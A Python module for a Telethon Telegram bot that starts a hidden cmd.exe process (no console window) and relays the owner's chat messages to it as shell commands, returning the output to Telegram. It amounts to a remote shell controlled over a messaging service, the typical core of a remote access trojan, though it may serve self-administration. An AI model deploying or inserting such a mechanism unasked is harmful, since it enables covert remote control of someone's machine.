import asyncio
import os
from telethon import events, Button
from bot import client
from config import ownerId

activeSessions = {}

def getSessionButtons(active=False):
    if not active:
        return [[Button.inline("Start CMD Session", b"cmdStart")]]
    return [
        [Button.inline("Download Full Log", b"cmdFullLog")],
        [Button.inline("Terminate Session", b"cmdTerminate")]
    ]

@client.on(events.CallbackQuery(data=b"cmd"))
async def showCmdEntry(event):
    if event.sender_id != ownerId:
        await event.answer("Access denied", alert=True)
        return

    uid = event.sender_id
    text = "Remote Windows CMD"
    buttons = getSessionButtons(uid in activeSessions)

    try:
        await event.edit(text, buttons=buttons)
    except:
        await event.answer("Cannot update", alert=True)


@client.on(events.CallbackQuery(data=b"cmdStart"))
async def launchSession(event):
    if event.sender_id != ownerId:
        return

    uid = event.sender_id

    if uid in activeSessions:
        await event.answer("Session already active", alert=True)
        return

    await event.edit("Starting cmd.exe...", buttons=None)

    try:
        proc = await asyncio.create_subprocess_exec(
            "cmd.exe",
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
            creationflags=0x08000000 if os.name == 'nt' else 0
        )

        activeSessions[uid] = {
            "proc": proc,
            "chatId": event.chat_id,
            "outputMessageId": None,
            "readerTask": None,
            "currentBlock": [],
            "skipInitial": True,
            "lastCommand": ""
        }

        async def readOutput():
            session = activeSessions[uid]
            buffer = []
            while True:
                try:
                    data = await proc.stdout.read(8192)
                    if not data:
                        if buffer:
                            session["currentBlock"].extend(buffer)
                            await flushBlock(uid)
                        break

                    text = data.decode('utf-8', errors='replace')
                    lines = text.splitlines(keepends=False)

                    for line in lines:
                        stripped = line.rstrip('\r\n')
                        if not stripped:
                            continue

                        if session["skipInitial"]:
                            if stripped.endswith('>'):
                                session["skipInitial"] = False
                            continue

                        if stripped == session["lastCommand"]:
                            continue

                        buffer.append(stripped)

                        if stripped.endswith('>'):
                            if buffer:
                                session["currentBlock"].extend(buffer)
                                buffer = []
                                await flushBlock(uid)

                except asyncio.CancelledError:
                    break
                except Exception:
                    break

            if buffer:
                session["currentBlock"].extend(buffer)
                await flushBlock(uid)

        readerTask = asyncio.create_task(readOutput())
        activeSessions[uid]["readerTask"] = readerTask

        await asyncio.sleep(2.5)

        readyText = "CMD session active\nType commands in this chat"
        await event.edit(readyText, buttons=getSessionButtons(True))

    except Exception as e:
        await event.edit(f"Failed to start cmd.exe\n{str(e)}", buttons=getSessionButtons(False))
        activeSessions.pop(uid, None)


async def flushBlock(uid):
    if uid not in activeSessions:
        return

    session = activeSessions[uid]
    if not session["currentBlock"]:
        return

    blockLines = session["currentBlock"][:]
    if session["lastCommand"]:
        blockLines.insert(0, f"> {session['lastCommand']}")

    blockText = "\n".join(blockLines)

    try:
        if session["outputMessageId"]:
            await client.edit_message(
                session["chatId"],
                session["outputMessageId"],
                f"```\n{blockText}\n```"
            )
        else:
            msg = await client.send_message(
                session["chatId"],
                f"```\n{blockText}\n```"
            )
            session["outputMessageId"] = msg.id
    except:
        pass

    session["currentBlock"] = []


@client.on(events.NewMessage(from_users=ownerId))
async def sendCommand(event):
    uid = event.sender_id
    if uid not in activeSessions:
        return

    cmd = event.raw_text.strip()
    if not cmd:
        return

    session = activeSessions[uid]
    session["lastCommand"] = cmd

    try:
        session["proc"].stdin.write((cmd + "\n").encode("utf-8", "replace"))
        await session["proc"].stdin.drain()
        await event.delete()
    except Exception as e:
        await event.reply(f"Failed to send command\n{str(e)}")
        await closeSession(uid)


@client.on(events.CallbackQuery(data=b"cmdTerminate"))
async def terminateHandler(event):
    if event.sender_id != ownerId:
        return

    uid = event.sender_id
    await closeSession(uid)
    await event.edit("Session terminated.", buttons=[])


async def closeSession(uid):
    if uid not in activeSessions:
        return

    session = activeSessions[uid]

    try:
        if session["readerTask"]:
            session["readerTask"].cancel()
        session["proc"].stdin.write(b"exit\n")
        await session["proc"].stdin.drain()
        await asyncio.sleep(0.7)
        session["proc"].terminate()
        await asyncio.sleep(0.4)
        session["proc"].kill()
    except:
        pass

    activeSessions.pop(uid, None)


@client.on(events.CallbackQuery(data=b"cmdFullLog"))
async def sendFullLog(event):
    if event.sender_id != ownerId:
        return

    uid = event.sender_id
    if uid not in activeSessions:
        await event.answer("No active session", alert=True)
        return

    session = activeSessions[uid]
    log = "\n\n".join(session["currentBlock"]) if session["currentBlock"] else "No log yet"

    if len(log) < 4000:
        await client.send_message(event.chat_id, f"```\n{log}\n```")
        await event.answer("Log sent", alert=False)
        return

    filename = f"cmd_log_{uid}_{int(asyncio.get_event_loop().time())}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(log)

    await client.send_file(event.chat_id, filename, caption="Full session log")
    try:
        os.remove(filename)
    except:
        pass

    await event.answer("File sent", alert=False)